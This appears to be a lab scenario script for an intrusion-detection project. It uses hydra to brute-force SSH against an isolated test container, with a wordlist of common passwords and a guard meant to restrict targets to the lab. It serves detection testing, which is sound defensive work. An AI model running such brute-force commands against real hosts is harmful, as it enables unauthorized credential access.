#!/bin/sh
# Scenario 2 - SSH brute force (MITRE T1110, credential access).
#
# victim-ssh exists for exactly this: infra/docker-compose.yml gives it the password
# `password123` "on purpose ... the brute-force target". So this is authentication
# against a throwaway container with a password the lab already published, on an
# isolated bridge - a detection test, not credential cracking.
#
#   docker compose --profile lab run --rm \
#     -v "$PWD/lab/scenarios:/scenarios" \
#     --network netsentinel_lab vanhauser/hydra sh /scenarios/brute_force.sh
#
# The signal an IDS reads is the burst of short SSH connections that mostly fail and
# then one that does not, so the wordlist ends on the known-good password.
set -eu

DIR=$(dirname "$0")
. "${DIR}/_guard.sh"

TARGET="${1:-$VICTIM_SSH}"
require_lab_target "$TARGET"

USER="labuser"
# A handful of wrong guesses, then the password the lab container ships with. The
# point is the failed-then-succeeded pattern, not discovering anything: the answer
# is in the compose file.
WORDLIST="$(mktemp)"
trap 'rm -f "$WORDLIST"' EXIT
cat > "$WORDLIST" <<'PASSWORDS'
123456
admin
letmein
root
toor
password
password123
PASSWORDS

echo "[brute] ${USER}@${TARGET} over SSH, ${TARGET}:22"
# -t 4 keeps the concurrency low enough that the lab container stays up and the flow
# records stay legible; a real attack would go wider, and a wider run detects at
# least as well.
hydra -l "$USER" -P "$WORDLIST" -t 4 -f "ssh://${TARGET}" || true

echo "[brute] done"
